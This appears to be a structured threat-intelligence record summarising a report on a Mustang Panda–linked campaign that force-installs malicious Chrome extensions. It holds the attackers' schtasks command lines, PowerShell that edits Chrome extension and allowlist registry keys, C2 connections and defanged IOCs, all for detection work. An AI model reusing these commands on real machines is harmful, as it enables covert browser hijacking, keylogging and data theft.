@@ -1,0 +1,132 @@
+title: 'Decoy Docs and Malicious Browser Extensions: A Closer Look at a Multi-Layered
+  Threat'
+description: A threat actor, linked to Mustang Panda, uses scheduled tasks and PowerShell
+  scripts to install malicious Chrome extensions by directly modifying the Windows
+  Registry, bypassing normal extension installation methods. The extensions are adaptations
+  of the open-source Extension-Code-Injector project and communicate with a C2 server
+  for keylogging, command execution, and data exfiltration.
+attribution: Mustang Panda
+malware_families:
+- protect_distribution.exe
+- browser-extension.crx
+- xl_ext_chrome.crx
+- Acrobat.exe
+- Cobalt Strike
+cves: []
+ttps:
+  processes:
+  - protect_distribution.exe
+  - powershell.exe
+  - taskeng.exe
+  - Acrobat.exe
+  - schtasks.exe
+  command_lines:
+  - schtasks /delete /tn ModifyRegistryTask1 /f
+  - schtasks /delete /tn ModifyRegistryTask2 /f
+  - schtasks /create /tn ModifyRegistryTask1 /tr "powershell.exe -ExecutionPolicy
+    Bypass -File C:\Windows\Temp\ModifyRegistry1.ps1" /sc once /st 05:04 /rl highest
+  - taskeng.exe {35C46379-7A58-4E6D-98CE-D88526114140} S-1-5-21-3294248377-1418901787-4083263181-1000:FMEDFXFE\Admin:Interactive:[1]
+  powershell:
+  - '$regPath = ''HKCU:\Software\Google\Chrome\Extensions\gomlcolffbhbcmcpofdnlhpadnigikjk''
+
+    $regPathValueName = ''path''
+
+    $regPathData = ''C:\Users\Admin\AppData\Local\ChromeExtensionCache\xl_ext_chrome.crx''
+
+    $regVersionValueName = ''version''
+
+    $regVersionData = ''1.0''
+
+    if (-not (Test-Path $regPath)) {
+
+    New-Item -Path $regPath -Force}
+
+    Set-ItemProperty -Path $regPath -Name $regPathValueName -Value $regPathData
+
+    Set-ItemProperty -Path $regPath -Name $regVersionValueName -Value $regVersionData
+
+    Add-Content -Path "C:\Windows\Temp\ModifyRegistryLog.txt" -Value "The script has
+    been executed successfully and the registry has been modified: $(Get-Date)"'
+  - '$regPath2 = ''HKCU:\Software\Policies\Google\Chrome\ExtensionInstallAllowlist''
+
+    $regValueName2 = ''1''
+
+    $regData2 = ''gomlcolffbhbcmcpofdnlhpadnigikjk''
+
+    if (-not (Test-Path $regPath2)) {
+
+    New-Item -Path $regPath2 -Force}
+
+    Set-ItemProperty -Path $regPath2 -Name $regValueName2 -Value $regData2
+
+    Add-Content -Path "C:\Windows\Temp\ModifyRegistryLog.txt" -Value "The script has
+    been executed successfully and the registry has been modified: $(Get-Date)"'
+  scripts:
+  - C:\Windows\Temp\ModifyRegistry1.ps1
+  - C:\Windows\Temp\ModifyRegistry2.ps1
+  registry_keys:
+  - HKCU:\Software\Google\Chrome\Extensions\gomlcolffbhbcmcpofdnlhpadnigikjk
+  - HKCU:\Software\Policies\Google\Chrome\ExtensionInstallAllowlist
+  image_loads: []
+  network_connections:
+  - xl_ext_chrome.crx -> 61978k512k.goho[.]co:443
+  - test.pdf.lnk -> 182.92.116[.]32:12777
+  - protect_distribution.exe -> 182.92.116[.]32:12777
+  - browser-extension -> 61978k512k.goho[.]co
+  - Acrobat.exe -> 182.92.116[.]32:12777
+  file_activity:
+  - C:\Users\Admin\AppData\Local\ChromeExtensionCache\xl_ext_chrome.crx
+  - C:\Windows\Temp\ModifyRegistryLog.txt
+  - C:\Windows\Temp\ModifyRegistry1.ps1
+  - protect_distribution.exe
+  - browser-extension.crx
+  - xl_ext_chrome.crx
+  - Acrobat.exe
+  - test.pdf.lnk
+  - test.txt
+  - distribution.zip
+  persistence:
+  - Scheduled task ModifyRegistryTask1 running powershell.exe -ExecutionPolicy Bypass
+    -File C:\Windows\Temp\ModifyRegistry1.ps1 at 05:04 with highest privileges
+  - Scheduled task ModifyRegistryTask2 running powershell.exe -ExecutionPolicy Bypass
+    -File C:\Windows\Temp\ModifyRegistry2.ps1 at 05:04 with highest privileges
+  - Registry key HKCU:\Software\Google\Chrome\Extensions\gomlcolffbhbcmcpofdnlhpadnigikjk
+    pointing to malicious Chrome extension xl_ext_chrome.crx
+  - Registry key HKCU:\Software\Policies\Google\Chrome\ExtensionInstallAllowlist adding
+    extension gomlcolffbhbcmcpofdnlhpadnigikjk to allowlist
+  - Scheduled task ModifyRegistryTask1 created via schtasks to run powershell.exe
+    -ExecutionPolicy Bypass -File C:\Windows\Temp\ModifyRegistry1.ps1
+  - Scheduled task ModifyRegistryTask2 created via schtasks to run powershell.exe
+    -ExecutionPolicy Bypass -File C:\Windows\Temp\ModifyRegistry2.ps1
+  - Registry key HKCU:\Software\Google\Chrome\Extensions\gomlcolffbhbcmcpofdnlhpadnigikjk
+    set to point to C:\Users\Admin\AppData\Local\ChromeExtensionCache\xl_ext_chrome.crx
+  - Registry key HKCU:\Software\Policies\Google\Chrome\ExtensionInstallAllowlist set
+    to allow extension gomlcolffbhbcmcpofdnlhpadnigikjk
+  process_relations:
+  - protect_distribution.exe -> schtasks.exe
+  - protect_distribution.exe -> taskeng.exe
+  - schtasks.exe -> taskeng.exe
+  - taskeng.exe -> powershell.exe
+iocs:
+  hashes:
+  - b553cd19fefd923981b8a14685630f844f9c3ced2fc392b0fad76d216f7334da
+  - d664a8714aefb5b30c06c44386f3915dda03d2995d18c901a030896dae6a6e96
+  - 8121538813de80b44ccaf093867984f17a5165741c427eb9e492c044b95b4bab
+  - 326abef91a6676241c915ff2e070cb210a1c5e9b6cfe72b4ac33bc080075f271
+  - 8bfab1a4aefc72faf96a424526428b4209f265ebb6020308cba45bbd0ff1952f
+  - 32033f5b4596caa21f8e59fa3b0ae140a30b10a7fb982a383b0c5722b851d2b2
+  ip_addresses:
+  - 182.92.116[.]32
+  - 117.72.70[.]169
+  - 115.236.153[.]170
+  domains:
+  - VPN.choicewell.com[.]cn
+  - 61978k512k.goho[.]co
+  urls:
+  - 182.92.116[.]32:12777/protect_distribution.exe
+  - hxxp://117.72.70[.]169/distribution.zip
+authors:
+- byrne_emmy12099
+reference: https://hunt.io/blog/decoy-docs-and-malicious-browser-extensions-a-closer-look-at-a-multi-layered-threat
+date_of_publication: September 10, 2024
+file_creation_date: May 22, 2026
